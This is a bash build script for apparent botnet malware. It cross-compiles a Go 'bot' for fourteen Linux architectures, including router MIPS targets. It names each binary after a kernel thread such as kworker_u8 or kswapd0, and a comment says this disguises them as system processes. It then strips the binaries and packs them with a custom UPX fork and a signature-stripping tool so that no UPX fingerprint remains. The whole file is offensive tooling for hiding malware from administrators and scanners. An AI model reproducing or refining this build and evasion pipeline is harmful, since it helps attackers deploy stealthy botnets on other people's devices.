#!/bin/bash

# Sins Custom legiatmate Name Builder
# x86 (386/amd64): m30w packer (custom UPX fork) — zero UPX fingerprint
# All other arches: system UPX + noMoreUPX.py signature stripping

# ======================== BINARY ARCHITECTURE MAPPING ========================
# Build for all architectures - each gets a different binary name from AMBS array
# 
# BINARY NAME    | ARCHITECTURE    | GOOS  | GOARCH | GOARM | COMMENTS
# ---------------|-----------------|-------|--------|-------|-------------------
# ksoftirqd0     | x86 (386)       | linux | 386    |       | 32-bit Intel/AMD
# kworker_u8     | x86_64          | linux | amd64  |       | 64-bit Intel/AMD
# jbd2_sda1d     | ARMv7           | linux | arm    | 7     | ARM 32-bit v7 (Raspberry Pi 2/3)
# bioset0        | ARMv5           | linux | arm    | 5     | ARM 32-bit v5 (older ARM)
# kblockd0       | ARMv6           | linux | arm    | 6     | ARM 32-bit v6 (Raspberry Pi 1)
# rcuop_0        | ARM64           | linux | arm64  |       | ARM 64-bit (Raspberry Pi 4, Android)
# kswapd0        | MIPS            | linux | mips   |       | MIPS big-endian (routers)
# ecryptfsd      | MIPSLE          | linux | mipsle |       | MIPS little-endian
# xfsaild_sda    | MIPS64          | linux | mips64 |       | MIPS 64-bit big-endian
# scsi_tmf_0     | MIPS64LE        | linux | mips64le |     | MIPS 64-bit little-endian
# devfreq_wq     | PPC64           | linux | ppc64  |       | PowerPC 64-bit big-endian
# zswap_shrinkd  | PPC64LE         | linux | ppc64le |      | PowerPC 64-bit little-endian
# edac_polld     | s390x           | linux | s390x  |       | IBM System/390 64-bit
# cfg80211d      | RISC-V 64       | linux | riscv64|       | RISC-V 64-bit

# Get the directory where this script is located (tools/)
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# Project root is one level up from tools/
PROJECT_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

# Find Go binary — prefer /usr/local/go/bin/go over system PATH
if [ -x "/usr/local/go/bin/go" ]; then
    GO_BIN="/usr/local/go/bin/go"
else
    GO_BIN="go"
fi
echo "Using Go: $GO_BIN ($($GO_BIN version 2>/dev/null))"

# Array of binary names to use for obfuscation (disguised as kernel/system processes)
AMBS=("ksoftirqd0" "kworker_u8" "jbd2_sda1d" "bioset0" "kblockd0"
      "rcuop_0" "kswapd0" "ecryptfsd" "xfsaild_sda" "scsi_tmf_0" "devfreq_wq"
      "zswap_shrinkd" "edac_polld" "cfg80211d")

# Create bins folder in project root if it doesn't exist
BINS_DIR="$PROJECT_ROOT/bins"
mkdir -p "$BINS_DIR"

# Locate system UPX — used for non-x86 arches
SYS_UPX=$(command -v upx 2>/dev/null)

# Counter for AMBS array
INDEX=0

# Function to build for a specific architecture
build_for_arch() {
    local arch_name="$1"   # Human-readable architecture name
    local goos="$2"        # GOOS value (operating system)
    local goarch="$3"      # GOARCH value (architecture)
    local goarm="$4"       # GOARM value (only for ARM)

    echo -e "\nBuilding for $arch_name..."

    local OUTPUT="$BINS_DIR/${AMBS[$INDEX]}"

    cd "$PROJECT_ROOT"

    if [ -n "$goarm" ]; then
        GOOS="$goos" GOARCH="$goarch" GOARM="$goarm" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
    else
        GOOS="$goos" GOARCH="$goarch" $GO_BIN build -trimpath -ldflags="-s -w -buildid=" -o "$OUTPUT" ./bot
    fi

    if [ ! -f "$OUTPUT" ]; then
        echo "ERROR: Build failed for $arch_name"
        return 1
    fi

    # Strip symbols (Go -s -w already strips, this is extra — silence failures on cross-arch)
    strip --strip-all "$OUTPUT" 2>/dev/null

    local before=$(stat -c%s "$OUTPUT")
    local bh=$(numfmt --to=iec --suffix=B $before 2>/dev/null || echo "${before}B")

    # x86 arches: use m30w (VPX) — zero UPX fingerprint
    # Everything else: system UPX + noMoreUPX.py signature strip
    local UPX_BIN="$SCRIPT_DIR/upx"
    case "$goarch" in
        386|amd64)
            if [ -x "$UPX_BIN" ]; then
                cp "$OUTPUT" "$OUTPUT.tmp"
                if "$UPX_BIN" --lzma "$OUTPUT.tmp" >/dev/null 2>&1 && \
                   [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
                    mv "$OUTPUT.tmp" "$OUTPUT"
                elif cp "$OUTPUT" "$OUTPUT.tmp" && \
                     "$UPX_BIN" --best "$OUTPUT.tmp" >/dev/null 2>&1 && \
                     [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
                    mv "$OUTPUT.tmp" "$OUTPUT"
                else
                    rm -f "$OUTPUT.tmp"
                    echo "    m30w packing skipped"
                    INDEX=$((INDEX + 1)); return
                fi
                local after=$(stat -c%s "$OUTPUT")
                local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
                local pct=$(( (before - after) * 100 / before ))
                echo "    m30w: $bh → $ah ($pct% smaller)"
            else
                echo "    WARNING: m30w packer not found at $UPX_BIN"
            fi
            ;;
        *)
            if [ -n "$SYS_UPX" ]; then
                cp "$OUTPUT" "$OUTPUT.tmp"
                if "$SYS_UPX" --lzma -q "$OUTPUT.tmp" >/dev/null 2>&1 && \
                   [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
                    python3 "$SCRIPT_DIR/noMoreUPX.py" "$OUTPUT.tmp"
                    mv "$OUTPUT.tmp" "$OUTPUT"
                elif cp "$OUTPUT" "$OUTPUT.tmp" && \
                     "$SYS_UPX" --best -q "$OUTPUT.tmp" >/dev/null 2>&1 && \
                     [ -f "$OUTPUT.tmp" ] && [ "$(stat -c%s "$OUTPUT.tmp")" -lt "$before" ]; then
                    python3 "$SCRIPT_DIR/noMoreUPX.py" "$OUTPUT.tmp"
                    mv "$OUTPUT.tmp" "$OUTPUT"
                else
                    rm -f "$OUTPUT.tmp"
                    echo "    UPX skipped (unsupported arch or no gain)"
                    INDEX=$((INDEX + 1)); return
                fi
                local after=$(stat -c%s "$OUTPUT")
                local ah=$(numfmt --to=iec --suffix=B $after 2>/dev/null || echo "${after}B")
                local pct=$(( (before - after) * 100 / before ))
                echo "    sysUPX+strip: $bh → $ah ($pct% smaller)"
            else
                echo "    WARNING: system UPX not found — shipping raw"
            fi
            ;;
    esac
    INDEX=$((INDEX + 1))
}

# Build for all architectures
build_for_arch "x86 (386)" "linux" "386"         # ksoftirqd0
build_for_arch "x86_64" "linux" "amd64"          # kworker_u8
build_for_arch "ARMv7" "linux" "arm" "7"         # jbd2_sda1d
build_for_arch "ARMv5" "linux" "arm" "5"         # bioset0
build_for_arch "ARMv6" "linux" "arm" "6"         # kblockd0
build_for_arch "ARM64" "linux" "arm64"           # rcuop_0
build_for_arch "MIPS" "linux" "mips"             # kswapd0
build_for_arch "MIPSLE" "linux" "mipsle"         # ecryptfsd
build_for_arch "MIPS64" "linux" "mips64"         # xfsaild_sda
build_for_arch "MIPS64LE" "linux" "mips64le"     # scsi_tmf_0
build_for_arch "PPC64" "linux" "ppc64"           # devfreq_wq
build_for_arch "PPC64LE" "linux" "ppc64le"       # zswap_shrinkd
build_for_arch "s390x" "linux" "s390x"           # edac_polld
build_for_arch "RISC-V 64" "linux" "riscv64"     # cfg80211d

echo -e "\nAll 14 builds complete!"
echo "Built binaries saved to $BINS_DIR/:"
ls -la "$BINS_DIR/"

echo -e "\nx86: m30w (zero fingerprint) | other: system UPX + noMoreUPX (sigs stripped)"
